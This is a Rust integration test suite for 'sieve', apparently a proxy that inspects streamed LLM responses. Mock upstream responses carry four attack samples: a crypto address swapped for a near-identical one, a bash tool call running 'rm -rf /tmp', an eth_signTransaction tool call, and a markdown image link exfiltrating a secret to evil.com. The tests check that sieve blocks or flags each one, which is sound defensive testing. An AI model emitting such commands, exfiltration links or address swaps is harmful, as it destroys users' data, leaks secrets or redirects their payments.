//! Sieve daemon 入站拦截集成测试（UCSB 4 类攻击 PoC，关联 PRD §10.1 Week 3 完成定义）。
//!
//! 启动真实 sieve 二进制 + mock 上游（返回带攻击 payload 的 SSE 流）+ 客户端发请求，
//! 验证：
//! 1. IN-CR-01 地址替换 — 同一会话内文本含原地址 + 一字符不同的地址 → 截流
//! 2. IN-CR-02 危险 shell 命令 — tool_use input 含 `rm -rf /` → 截流
//! 3. IN-CR-05 签名工具 — tool_use 名为 `eth_signTransaction` → 截流
//! 4. IN-CR-04 markdown exfil — text_delta 含 markdown image with query string → warn 不阻断
//!
//! 入站截流场景：sieve 注入 sieve_blocked event 后 drop tx，hyper StreamBody 结束；
//! 若上游响应带 content-length，sieve 透传该 header 后注入额外字节导致 HTTP 长度不一致。
//! 因此 mock upstream 使用 StreamBody（无 content-length），迫使 hyper 用 chunked transfer。
//!
//! .cursorrules §3.2：测试代码允许使用 .unwrap()。

use bytes::Bytes;
use http_body_util::{BodyExt, StreamBody};
use hyper::body::{Frame, Incoming};
use hyper::server::conn::http1 as server_http1;
use hyper::service::service_fn;
use hyper::{Request, Response};
use hyper_util::rt::TokioIo;
use std::convert::Infallible;
use std::io::Write as _;
use std::net::{SocketAddr, TcpListener as StdListener};
use std::path::PathBuf;
use std::process::{Child, Command, Stdio};
use std::time::{Duration, Instant};
use tokio::net::TcpListener;
use tokio::sync::oneshot;

// ─── helpers ──────────────────────────────────────────────────────────────────

fn find_free_port() -> u16 {
    let l = StdListener::bind("127.0.0.1:0").unwrap();
    l.local_addr().unwrap().port()
}

fn workspace_root() -> PathBuf {
    let mut p = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    p.pop(); // sieve-cli → crates/
    p.pop(); // crates/ → workspace root
    p
}

fn sieve_binary() -> PathBuf {
    let root = workspace_root();
    let release = root.join("target/release/sieve");
    if release.exists() {
        return release;
    }
    root.join("target/debug/sieve")
}

fn outbound_rules_path() -> PathBuf {
    workspace_root().join("crates/sieve-rules/rules/outbound.toml")
}

fn inbound_rules_path() -> PathBuf {
    workspace_root().join("crates/sieve-rules/rules/inbound.toml")
}

/// 把 (event_name, data) 列表序列化为 SSE bytes。
fn sse_response(events: &[(&str, &str)]) -> Bytes {
    let mut s = String::new();
    for (event_name, data) in events {
        s.push_str(&format!("event: {event_name}\ndata: {data}\n\n"));
    }
    Bytes::from(s)
}

/// mock 上游 StreamBody 类型（size_hint unknown → hyper 用 chunked transfer，不加 content-length）。
type MockBody = StreamBody<tokio_stream::Once<Result<Frame<Bytes>, Infallible>>>;

/// 把 Bytes 包成 StreamBody（无 exact size_hint）。
///
/// hyper 对 `Full<Bytes>` 会自动加 content-length；StreamBody unknown size 时用 chunked。
/// sieve 透传 content-length 到客户端，注入 sieve_blocked 后实际 body 超出长度，HTTP 协议错误。
fn bytes_to_chunked_body(data: Bytes) -> MockBody {
    let stream = tokio_stream::once(Ok::<_, Infallible>(Frame::data(data)));
    StreamBody::new(stream)
}

/// 在 :0 端口启动 plain-HTTP mock 上游（chunked transfer），返回 (addr, shutdown sender)。
///
/// responder 返回 (status, body_bytes)；Content-Type 固定为 `text/event-stream`。
async fn spawn_mock_sse_upstream<F, Fut>(responder: F) -> (SocketAddr, oneshot::Sender<()>)
where
    F: Fn(Request<Bytes>) -> Fut + Clone + Send + Sync + 'static,
    Fut: std::future::Future<Output = (hyper::StatusCode, Bytes)> + Send,
{
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    let (tx, mut rx) = oneshot::channel::<()>();

    tokio::spawn(async move {
        loop {
            tokio::select! {
                _ = &mut rx => break,
                accept = listener.accept() => {
                    let Ok((stream, _)) = accept else { continue };
                    let io = TokioIo::new(stream);
                    let r = responder.clone();
                    tokio::spawn(async move {
                        let svc = service_fn(move |req: Request<Incoming>| {
                            let r = r.clone();
                            async move {
                                let (parts, body) = req.into_parts();
                                let bytes = body
                                    .collect()
                                    .await
                                    .unwrap_or_default()
                                    .to_bytes();
                                let req_collected = Request::from_parts(parts, bytes);
                                let (status, body_bytes) = r(req_collected).await;
                                // 用 StreamBody（无 content-length），让 sieve 也不透传 content-length
                                let resp: Response<MockBody> = Response::builder()
                                    .status(status)
                                    .header(http::header::CONTENT_TYPE, "text/event-stream")
                                    .body(bytes_to_chunked_body(body_bytes))
                                    .unwrap();
                                Ok::<_, Infallible>(resp)
                            }
                        });
                        let _ = server_http1::Builder::new()
                            .serve_connection(io, svc)
                            .await;
                    });
                }
            }
        }
    });

    (addr, tx)
}

/// daemon spawn / shutdown guard。Drop 时 SIGKILL。
struct DaemonGuard {
    proc: Child,
    _config_file: tempfile::NamedTempFile,
}

impl Drop for DaemonGuard {
    fn drop(&mut self) {
        let _ = self.proc.kill();
        let _ = self.proc.wait();
    }
}

/// 启动真实 sieve daemon，返回 (listen_port, guard)。
fn spawn_sieve_daemon(upstream_url: &str) -> (u16, DaemonGuard) {
    let port = find_free_port();
    let rules = outbound_rules_path();
    assert!(
        rules.exists(),
        "outbound rules not found at {}",
        rules.display()
    );
    let inbound_rules = inbound_rules_path();
    assert!(
        inbound_rules.exists(),
        "inbound rules not found at {}",
        inbound_rules.display()
    );

    let mut config_file = tempfile::NamedTempFile::new().unwrap();
    writeln!(
        config_file,
        r#"upstream_url = "{}"
port = {}
bind_addr = "127.0.0.1"
rules_path = "{}"
inbound_rules_path = "{}"
tls_verify_upstream = false
dry_run = false
"#,
        upstream_url,
        port,
        rules.display(),
        inbound_rules.display(),
    )
    .unwrap();

    let binary = sieve_binary();
    assert!(
        binary.exists(),
        "sieve binary not found at {}; run `cargo build --release` first",
        binary.display()
    );

    let proc = Command::new(&binary)
        .arg("start")
        .arg("--config")
        .arg(config_file.path())
        .env("SIEVE_LOG", "warn")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .expect("spawn sieve daemon");

    // 等 daemon 监听，最长 10 秒
    let deadline = Instant::now() + Duration::from_secs(10);
    loop {
        if std::net::TcpStream::connect_timeout(
            &format!("127.0.0.1:{port}").parse().unwrap(),
            Duration::from_millis(500),
        )
        .is_ok()
        {
            break;
        }
        if Instant::now() >= deadline {
            panic!("sieve daemon did not listen on :{port} within 10 s");
        }
        std::thread::sleep(Duration::from_millis(100));
    }

    (
        port,
        DaemonGuard {
            proc,
            _config_file: config_file,
        },
    )
}

/// 发 POST /v1/messages，使用原始 TCP 读取响应。
///
/// 使用 `Connection: close` + `read_to_end` 确保读到 EOF（包含 sieve 注入的 sieve_blocked event）。
/// 这样完全绕过 hyper client 的 content-length 校验，即使响应是 chunked 也能正确读取。
fn fetch_response_body_raw(port: u16) -> (hyper::StatusCode, Bytes) {
    use std::io::{Read, Write};
    use std::net::TcpStream;

    let body_json = r#"{"model":"claude-sonnet-4-5","max_tokens":16,"stream":true,"messages":[{"role":"user","content":"hi"}]}"#;
    let request = format!(
        "POST /v1/messages HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nContent-Type: application/json\r\nContent-Length: {len}\r\nConnection: close\r\n\r\n{body}",
        port = port,
        len = body_json.len(),
        body = body_json,
    );

    let mut stream = TcpStream::connect(format!("127.0.0.1:{port}")).unwrap();
    stream
        .set_read_timeout(Some(Duration::from_secs(10)))
        .unwrap();
    stream.write_all(request.as_bytes()).unwrap();
    stream.flush().unwrap();

    // 读全部响应（Connection: close 保证 server 关闭连接后即可读完）
    let mut raw = Vec::new();
    stream.read_to_end(&mut raw).ok(); // ok() 容忍 connection reset

    // 解析 status line
    let raw_str = String::from_utf8_lossy(&raw);
    let status_code = raw_str
        .lines()
        .next()
        .and_then(|line| line.split_whitespace().nth(1))
        .and_then(|code| code.parse::<u16>().ok())
        .unwrap_or(0);
    let status = hyper::StatusCode::from_u16(status_code).unwrap_or(hyper::StatusCode::OK);

    // 找 header/body 分隔符 \r\n\r\n
    let sep = b"\r\n\r\n";
    let raw_body = if let Some(pos) = raw.windows(sep.len()).position(|w| w == sep) {
        &raw[pos + sep.len()..]
    } else {
        &[]
    };

    // chunked transfer encoding 解码：
    // 格式：<hex-length>\r\n<data>\r\n ... 0\r\n\r\n
    let decoded = decode_chunked(raw_body);
    (status, Bytes::from(decoded))
}

/// 简单的 chunked transfer encoding 解码器（不依赖第三方库）。
///
/// 若输入不是有效 chunked 格式（如 plain body），直接返回原始内容。
fn decode_chunked(input: &[u8]) -> Vec<u8> {
    let mut result = Vec::new();
    let mut pos = 0;

    // 尝试 chunked 解码
    while pos < input.len() {
        // 找 \r\n 分隔符（chunk size line 结尾）
        let Some(crlf_pos) = find_crlf(input, pos) else {
            // 没找到 \r\n，可能是 plain body，直接返回原始内容
            result.extend_from_slice(input);
            return result;
        };
        // 解析 chunk size（hex）
        let size_str = std::str::from_utf8(&input[pos..crlf_pos]).unwrap_or("0");
        let chunk_size = usize::from_str_radix(size_str.trim(), 16).unwrap_or(0);
        pos = crlf_pos + 2; // skip \r\n

        if chunk_size == 0 {
            // last chunk
            break;
        }

        if pos + chunk_size > input.len() {
            // 不完整的 chunk，尽力读
            result.extend_from_slice(&input[pos..]);
            break;
        }
        result.extend_from_slice(&input[pos..pos + chunk_size]);
        pos += chunk_size + 2; // skip chunk data + \r\n
    }

    if result.is_empty() {
        // 解码失败或 plain body，返回原始
        result.extend_from_slice(input);
    }
    result
}

fn find_crlf(data: &[u8], start: usize) -> Option<usize> {
    (start..data.len().saturating_sub(1)).find(|&i| data[i] == b'\r' && data[i + 1] == b'\n')
}

/// 异步包装：spawn_blocking 运行原始 TCP 读取（避免阻塞 tokio executor）。
async fn fetch_response_body(port: u16) -> (hyper::StatusCode, Bytes) {
    tokio::task::spawn_blocking(move || fetch_response_body_raw(port))
        .await
        .unwrap()
}

// ─── UCSB Attack 1: Address Substitution（IN-CR-01）─────────────────────────

/// 同一 SSE 流：第一个 event 植入原始地址，第二个 event 出现近似地址（末字符 2→3）→ 截流。
///
/// 关联 PRD §5.2 IN-CR-01 / UCSB 论文 attack 1。
#[tokio::test]
async fn ucsb_attack_1_address_substitution_blocked() {
    // 原始地址：0xabcdef1234567890abcdef1234567890abcdef12
    // 替换地址：0xabcdef1234567890abcdef1234567890abcdef13（末字符 2→3，Levenshtein=1）
    let attack_payload = sse_response(&[
        (
            "message_start",
            r#"{"type":"message_start","message":{"id":"m","type":"message","role":"assistant","content":[],"model":"x","usage":{"input_tokens":1,"output_tokens":1}}}"#,
        ),
        (
            "content_block_start",
            r#"{"type":"content_block_start","index":0,"content_block":{"type":"text","text":""}}"#,
        ),
        // 第一个 delta：植入原始地址
        (
            "content_block_delta",
            r#"{"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"send to 0xabcdef1234567890abcdef1234567890abcdef12 for payment"}}"#,
        ),
        // 第二个 delta：出现近似地址（末字符 2→3）→ IN-CR-01 触发
        (
            "content_block_delta",
            r#"{"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"actually send to 0xabcdef1234567890abcdef1234567890abcdef13"}}"#,
        ),
        (
            "content_block_stop",
            r#"{"type":"content_block_stop","index":0}"#,
        ),
        ("message_stop", r#"{"type":"message_stop"}"#),
    ]);

    let (upstream, _up) = spawn_mock_sse_upstream(move |_req| {
        let body = attack_payload.clone();
        async move { (hyper::StatusCode::OK, body) }
    })
    .await;

    let (port, _g) = spawn_sieve_daemon(&format!("http://{upstream}"));
    let (status, body) = fetch_response_body(port).await;

    assert_eq!(
        status,
        hyper::StatusCode::OK,
        "upstream 200 should be preserved in response parts"
    );
    let body_str = String::from_utf8_lossy(&body);
    assert!(
        body_str.contains("sieve_blocked"),
        "expected sieve_blocked event in body:\n{body_str}"
    );
    assert!(
        body_str.contains("IN-CR-01"),
        "expected IN-CR-01 rule in detection:\n{body_str}"
    );
}

// ─── UCSB Attack 2: Dangerous Shell in tool_use input（IN-CR-02）──────────────

/// tool_use input_json_delta 含 `rm -rf /tmp` → 聚合完成后 IN-CR-02 触发截流。
///
/// 关联 PRD §5.2 IN-CR-02 / UCSB 论文 attack 2。
#[tokio::test]
async fn ucsb_attack_2_dangerous_shell_in_tool_use_blocked() {
    let attack_payload = sse_response(&[
        (
            "message_start",
            r#"{"type":"message_start","message":{"id":"m","type":"message","role":"assistant","content":[],"model":"x","usage":{"input_tokens":1,"output_tokens":1}}}"#,
        ),
        (
            "content_block_start",
            r#"{"type":"content_block_start","index":1,"content_block":{"type":"tool_use","id":"t1","name":"bash","input":{}}}"#,
        ),
        // input_json_delta：包含危险 shell 命令，符合 IN-CR-02 pattern `rm\s+-rf?\s+[/~*]`
        (
            "content_block_delta",
            r#"{"type":"content_block_delta","index":1,"delta":{"type":"input_json_delta","partial_json":"{\"command\": \"rm -rf /tmp\"}"}}"#,
        ),
        (
            "content_block_stop",
            r#"{"type":"content_block_stop","index":1}"#,
        ),
        ("message_stop", r#"{"type":"message_stop"}"#),
    ]);

    let (upstream, _up) = spawn_mock_sse_upstream(move |_req| {
        let body = attack_payload.clone();
        async move { (hyper::StatusCode::OK, body) }
    })
    .await;

    let (port, _g) = spawn_sieve_daemon(&format!("http://{upstream}"));
    let (_status, body) = fetch_response_body(port).await;

    let body_str = String::from_utf8_lossy(&body);
    assert!(
        body_str.contains("sieve_blocked"),
        "expected sieve_blocked event in body:\n{body_str}"
    );
    assert!(
        body_str.contains("IN-CR-02"),
        "expected IN-CR-02 rule in detection:\n{body_str}"
    );
}

// ─── UCSB Attack 3: Signing Tool Call（IN-CR-05-EVM）────────────────────────

/// tool_use name = `eth_signTransaction` → 聚合完成后 IN-CR-05-EVM 触发截流。
///
/// 关联 PRD §5.2 IN-CR-05 / UCSB 论文 attack 3。
#[tokio::test]
async fn ucsb_attack_3_signing_tool_blocked() {
    let attack_payload = sse_response(&[
        (
            "message_start",
            r#"{"type":"message_start","message":{"id":"m","type":"message","role":"assistant","content":[],"model":"x","usage":{"input_tokens":1,"output_tokens":1}}}"#,
        ),
        (
            "content_block_start",
            r#"{"type":"content_block_start","index":1,"content_block":{"type":"tool_use","id":"t2","name":"eth_signTransaction","input":{}}}"#,
        ),
        (
            "content_block_delta",
            r#"{"type":"content_block_delta","index":1,"delta":{"type":"input_json_delta","partial_json":"{\"to\":\"0xabc\",\"value\":\"1000\"}"}}"#,
        ),
        (
            "content_block_stop",
            r#"{"type":"content_block_stop","index":1}"#,
        ),
        ("message_stop", r#"{"type":"message_stop"}"#),
    ]);

    let (upstream, _up) = spawn_mock_sse_upstream(move |_req| {
        let body = attack_payload.clone();
        async move { (hyper::StatusCode::OK, body) }
    })
    .await;

    let (port, _g) = spawn_sieve_daemon(&format!("http://{upstream}"));
    let (_status, body) = fetch_response_body(port).await;

    let body_str = String::from_utf8_lossy(&body);
    assert!(
        body_str.contains("sieve_blocked"),
        "expected sieve_blocked event in body:\n{body_str}"
    );
    // IN-CR-05-EVM 是实际命中的规则 ID（tool name 扫描走 vectorscan）
    assert!(
        body_str.contains("IN-CR-05"),
        "expected IN-CR-05* rule in detection:\n{body_str}"
    );
}

// ─── UCSB Attack 4: Markdown Exfil（IN-CR-04 warn only）─────────────────────

/// IN-CR-04 是 high/warn，不在 fail-closed 名单，不截流，响应内容包含原始 event。
///
/// 关联 PRD §5.2 IN-CR-04 / UCSB 论文 attack 4。
#[tokio::test]
async fn ucsb_attack_4_markdown_exfil_warn_only_passes_through() {
    let attack_payload = sse_response(&[
        (
            "content_block_delta",
            r#"{"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"![log](https://evil.com/track?d=secret)"}}"#,
        ),
        ("message_stop", r#"{"type":"message_stop"}"#),
    ]);

    let (upstream, _up) = spawn_mock_sse_upstream(move |_req| {
        let body = attack_payload.clone();
        async move { (hyper::StatusCode::OK, body) }
    })
    .await;

    let (port, _g) = spawn_sieve_daemon(&format!("http://{upstream}"));
    let (status, body) = fetch_response_body(port).await;

    assert_eq!(
        status,
        hyper::StatusCode::OK,
        "warn-level rule should not affect status"
    );

    let body_str = String::from_utf8_lossy(&body);
    assert!(
        !body_str.contains("sieve_blocked"),
        "IN-CR-04 is warn-only, must not inject sieve_blocked:\n{body_str}"
    );
    // body 应该包含原始 event（透传，不被截断）
    assert!(
        body_str.contains("content_block_delta"),
        "warn-level response should contain original SSE events:\n{body_str}"
    );
    assert!(
        body_str.contains("message_stop"),
        "warn-level response should contain message_stop event:\n{body_str}"
    );
}

// ─── 反向测试：benign 响应不被截流（防止误报）──────────────────────────────────

/// benign SSE 响应（无任何攻击 payload）→ 正常透传，无 sieve_blocked 注入。
///
/// 关联 PRD §9 #7：Critical 拦截 FP < 0.5%。
#[tokio::test]
async fn benign_response_passes_through_unchanged() {
    let benign_payload = sse_response(&[
        (
            "message_start",
            r#"{"type":"message_start","message":{"id":"m","type":"message","role":"assistant","content":[],"model":"x","usage":{"input_tokens":1,"output_tokens":1}}}"#,
        ),
        (
            "content_block_start",
            r#"{"type":"content_block_start","index":0,"content_block":{"type":"text","text":""}}"#,
        ),
        (
            "content_block_delta",
            r#"{"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"Hello, how can I help you today?"}}"#,
        ),
        (
            "content_block_stop",
            r#"{"type":"content_block_stop","index":0}"#,
        ),
        ("message_stop", r#"{"type":"message_stop"}"#),
    ]);

    let (upstream, _up) = spawn_mock_sse_upstream(move |_req| {
        let body = benign_payload.clone();
        async move { (hyper::StatusCode::OK, body) }
    })
    .await;

    let (port, _g) = spawn_sieve_daemon(&format!("http://{upstream}"));
    let (status, body) = fetch_response_body(port).await;

    assert_eq!(
        status,
        hyper::StatusCode::OK,
        "benign should pass through with 200"
    );

    let body_str = String::from_utf8_lossy(&body);
    assert!(
        !body_str.contains("sieve_blocked"),
        "benign response must not trigger sieve_blocked:\n{body_str}"
    );
    assert!(
        body_str.contains("message_stop"),
        "benign response should contain message_stop:\n{body_str}"
    );
    assert!(
        body_str.contains("Hello"),
        "benign response should contain original text:\n{body_str}"
    );
}
